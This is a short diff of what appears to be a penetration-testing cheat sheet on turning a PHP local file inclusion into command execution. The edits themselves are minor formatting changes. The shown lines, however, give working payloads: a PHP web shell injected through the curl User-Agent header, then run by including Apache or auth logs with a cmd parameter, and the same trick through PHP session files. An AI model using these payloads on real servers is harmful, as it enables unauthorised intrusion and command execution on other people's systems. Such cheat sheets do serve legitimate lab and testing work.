@@ -583,7 +583,7 @@ nc ip 80
   
 or
   
-curl http://ip/index.php -A '\<?php system($_GET[‘cmd’]); ?>'
+curl -s http://ip/index.php -A '\<?php system($_GET[‘cmd’]); ?>'
   
 http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
   
@@ -605,9 +605,9 @@ http://ip/index.php?file=/var/log/auth.log&cmd=id
   
 -> PHP session
 
-http://ip/index.php?file=<?php system($_GET["cmd"];?>
+http://ip/index.php?file=\<?php system($_GET["cmd"];?>
   
-http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
+http://ip/index.php?file=/var/lib/php/sessions/sess_\<your_session>&cmd=id
   
 -> Others:
 
